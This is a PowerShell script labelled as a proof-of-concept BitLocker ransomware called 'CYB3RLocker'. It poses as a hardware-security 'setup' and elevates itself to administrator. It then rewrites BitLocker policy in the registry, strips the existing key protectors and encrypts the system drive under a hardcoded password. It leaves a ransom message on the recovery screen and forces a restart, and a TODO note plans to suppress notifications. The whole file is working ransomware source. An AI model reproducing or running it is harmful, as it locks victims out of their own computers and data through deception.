# PoC of BitLocker based ransomware

<# TODO:
Enable focus assist to block BitLocker notification to pop up.
#>

$host.ui.RawUI.WindowTitle = 'CYB3RLocker Setup - secure your hardware and spend some money!'
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
If (!( $isAdmin )) {
    Write-Host '+----------------------------------------------------------+' -ForegroundColor Cyan -BackgroundColor white
    Write-Host '| CYB3RLocker - secure your hardware and spend some money! |' -ForegroundColor Cyan -BackgroundColor white
    Write-Host '+----------------------------------------------------------+' -ForegroundColor Cyan -BackgroundColor white
    Write-Host "`nInstallation requires administrator privileges. Elevating..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs 
    exit
}

$host.ui.RawUI.WindowTitle = 'CYB3RLocker Setup - secure your hardware and spend some money!'
$RecoveryMessage = 'PoC Cyber Rangers: Your computer was encrypted using CYB3RLocker. To pay the ransom, contact us at fake@fake.fake!!!!'
$PlainPassword = "P@ssw0rdP@ssw0rdP@ssw0rdP@ssw0rd"

Write-Host '+----------------------------------------------------------+' -ForegroundColor Cyan -BackgroundColor white
Write-Host '| CYB3RLocker - secure your hardware and spend some money! |' -ForegroundColor Cyan -BackgroundColor white
Write-Host '+----------------------------------------------------------+' -ForegroundColor Cyan -BackgroundColor white
Write-Host "`nInstalling CYB3RLocker. Please wait..."
Start-Sleep -Seconds 3

REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /t REG_DWORD /d 2 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKey /t REG_DWORD /d 2 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /t REG_SZ /d $RecoveryMessage /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d 2 /f | Out-Null
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f | Out-Null

$SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force
switch ((get-BitLockervolume -mountpoint $ENV:SystemDrive).ProtectionStatus) {
    'On' {

        foreach ($ID in (get-BitLockervolume -mountpoint $ENV:SystemDrive).KeyProtector.KeyProtectorID) {

            Remove-BitLockerKeyProtector -Mountpoint $ENV:SystemDrive -KeyProtectorID $ID | Out-Null
        }
        add-BitLockerkeyprotector -mountpoint $ENV:SystemDrive -PasswordProtector -Password $securepassword | Out-Null
        add-BitLockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ | Out-Null
        Resume-BitLocker -MountPoint $ENV:SystemDrive | Out-Null
    }
    'Off' {

        enable-BitLocker `
            -EncryptionMethod Aes256 `
            -password $securepassword `
            -mountpoint $ENV:SystemDrive  `
            -PasswordProtector -skiphardwaretest `
            -UsedSpaceOnly | Out-Null

        do {
            Start-Sleep -Seconds 5
            write-host "`tInstallation in progress: $(Get-BitLockerVolume -MountPoint c: | Select-Object -ExpandProperty encryptionpercentage)%."
        }
        until ($(Get-BitLockerVolume -MountPoint "C:" | Select-Object -ExpandProperty ProtectionStatus) -eq 'On')


        add-BitLockerkeyprotector   -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ | Out-Null
    }
}

Write-Host 'Installation successfully completed! Hit ENTER to restart your system and enjoy your secured computer!' -ForegroundColor Black -BackgroundColor Green
Read-Host | Out-Null

Restart-Computer -Confirm:$false